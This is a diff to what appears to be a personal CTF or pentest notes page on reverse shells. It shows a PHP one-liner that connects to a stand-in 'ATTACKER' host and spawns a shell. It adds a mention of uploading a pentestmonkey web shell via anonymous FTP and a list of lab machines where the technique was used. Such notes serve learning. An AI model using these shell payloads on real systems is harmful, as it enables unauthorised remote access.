@@ -35,6 +35,8 @@ PHP:
 <?php $sock=fsockopen("ATTACKER",443); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
 ```
 
+> The full pentestmonkey PHP reverse shell was uploaded via anonymous FTP → [[web-shell-upload]] in [[anonymous-pingu]].
+
 ## Stabilizing the shell
 
 ```sh
@@ -45,6 +47,6 @@ script /dev/null -c bash
 
 ## Seen in
 
-[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]]
+[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]]
 
 > Node inspector tip ([[autoescuela]]): spawn the shell with async `exec()`/`spawn()`, not `execSync()` — the sync form blocks the event loop and freezes the app.
